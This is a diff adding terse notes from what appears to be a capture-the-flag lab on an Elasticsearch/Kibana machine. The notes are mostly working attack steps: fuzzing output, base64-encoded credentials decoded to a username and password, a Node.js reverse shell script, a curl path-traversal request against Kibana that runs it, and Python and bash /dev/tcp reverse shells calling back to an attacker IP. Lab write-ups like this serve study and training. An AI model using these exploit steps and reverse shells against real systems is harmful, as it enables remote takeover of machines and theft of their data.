@@ -1,0 +1,56 @@
+in / image :
+	la aguja en el pajar es "clave"
+	l'aiguille dans la botte de foin est "clé"
+
+Target: http://10.10.10.115:9200/FUZZ
+
+001393:  C=200      0 L	      19 W	   2959 Ch	  "_search"
+001421:  C=200      0 L	       1 W	  16688 Ch	  "_stats"
+001438:  C=200      0 L	       1 W	  40327 Ch	  "_template"
+003105:  C=200      0 L	       1 W	   1010 Ch	  "bank"
+007427:  C=200      8 L	      37 W	   1529 Ch	  "favicon.ico"
+014873:  C=200      0 L	       1 W	    338 Ch	  "quotes"
+
+Target: http://10.10.10.115:9200/_search?FUZZ
+
+001409:  C=200      0 L	      19 W	   2959 Ch	  "_source"
+007845:  C=200      0 L	      19 W	   2959 Ch	  "format"
+009183:  C=200      0 L	      19 W	   2959 Ch	  "human"
+009563:  C=200      0 L	      19 W	   2959 Ch	  "index"
+014778:  C=200      0 L	       1 W	    137 Ch	  "q"
+015619:  C=200      0 L	       1 W	    133 Ch	  "routing"
+016884:  C=200      0 L	      19 W	   2960 Ch	  "sort"
+016897:  C=500      0 L	      11 W	    239 Ch	  "source"
+017189:  C=200      0 L	      19 W	   2959 Ch	  "stats"
+018578:  C=200      0 L	      19 W	   2959 Ch	  "type"
+019114:  C=200      0 L	      19 W	   2959 Ch	  "version"
+
+http://10.10.10.115:9200/_search?q=clave
+
+"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
+security
+"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="	
+pass: spanish.is.key
+
+in /tmp/shell.js :
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(4444, "10.10.14.23", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+
+listener on my box 
+curl -v -g http://127.0.0.1:5601/api/console/api_server?apis=../../../../../../.../../../../tmp/shell.js
+
+/opt/kibana : 
+Ejecutar comando: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.10.14.23,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);'
+
+Ejecutar comando : /bin/bash -i >& /dev/tcp/10.10.14.23/9002 0>&1
